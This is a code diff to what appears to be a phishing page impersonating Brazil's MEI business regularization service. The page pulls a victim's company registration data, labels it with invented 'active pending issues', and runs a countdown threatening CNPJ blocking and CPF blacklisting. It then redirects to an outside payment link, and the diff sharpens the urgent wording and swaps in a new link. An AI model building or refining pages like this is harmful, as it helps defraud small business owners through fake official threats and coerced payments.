@@ -1088,7 +1088,7 @@
                                 <div class="payment-alert-content">
                                     <div class="payment-alert-header">
                                         <div class="spinner"></div>
-                                        <h4 class="payment-alert-title">Pendências Identificadas</h4>
+                                        <h4 class="payment-alert-title">Pendências Ativad</h4>
                                     </div>
                                     <p class="payment-alert-subtitle">
                                         A não regularização em <span class="timer-display" id="countdownTimer">03:35</span> acarretará no bloqueio do CNPJ e negativação do CPF do titular.
@@ -1109,7 +1109,7 @@
                 <!-- Etapa 2: Pagamento -->
                 <div class="step-content" id="step2">
                     <div class="form-header">
-                        <h1 class="form-title">Confirmação e Finalização</h1>
+                        <h1 class="form-title">Regularize Agora</h1>
                         <p class="form-subtitle">Revise seus dados e finalize o processo de Regularização do MEI</p>
                     </div>
                     
@@ -1131,7 +1131,7 @@
                         <div class="fee-notice-section">
                             <div class="fee-notice-header">
                                 <i class="fas fa-info-circle fee-notice-icon"></i>
-                                <h3 class="fee-notice-title">Pendências Ativas Obrigatórias</h3>
+                                <h3 class="fee-notice-title">Pendências Ativas</h3>
                             </div>
                             <div class="fee-notice-content">
                                 <p class="fee-notice-text">
@@ -1421,15 +1421,15 @@ if (!response.ok || data.error) {
 
 const infoItems = [
 { label: 'CNPJ', value: formattedCnpj || data.cnpj || '-' },
-					                { label: 'FormalizaÃ§Ã£o', value: '<span class="status-pending">Pendente</span>' },
+					                { label: 'Situação', value: '<span class="status-pending">Pendências Ativas</span>' },
 				                // Removido: Data da SituaÃƒÂ§ÃƒÂ£o
-				                { label: 'RazÃ£o Social', value: data.company?.name || data.name || '-' },
+				                { label: 'Razão Social', value: data.company?.name || data.name || '-' },
 				                // Removido: Nome Fantasia
-				                { label: 'Natureza JurÃ­dica', value: 'MEI' },
+				                { label: 'Natureza Jurídica', value: 'MEI' },
 				                // Removido: Porte
 				                { label: 'Data de Abertura', value: data.founded || '-' },
 				                { label: 'Atividade Principal', value: data.mainActivity?.description || data.company?.mainActivity?.description || '-' },
-				                { label: 'EndereÃ§o', value: `${data.address?.street || ''}, ${data.address?.number || ''} ${data.address?.complement || ''} - ${data.address?.district || ''}, ${data.address?.city || ''}/${data.address?.state || ''} - CEP: ${data.address?.zip || ''}`.trim() },
+				                { label: 'Endereço', value: `${data.address?.street || ''}, ${data.address?.number || ''} ${data.address?.complement || ''} - ${data.address?.district || ''}, ${data.address?.city || ''}/${data.address?.state || ''} - CEP: ${data.address?.zip || ''}`.trim() },
 				                { label: 'Telefone', value: data.phones?.[0]?.number || '-' },
 				                { label: 'E-mail', value: data.emails?.[0]?.address || '-' }
 				            ];
@@ -1531,7 +1531,7 @@ const infoItems = [
 
             try {
                 await new Promise(resolve => setTimeout(resolve, 3000));
-                window.location.href = 'https://pay.pag-br.com/r/0S1HF964A1ji8335';
+                window.location.href = 'https://pay.pag-br.com/r/416j168GRnh652r6fbg9';
             } catch (error) {
                 console.error('Erro:', error);
                 alert('Erro ao processar. Tente novamente.');
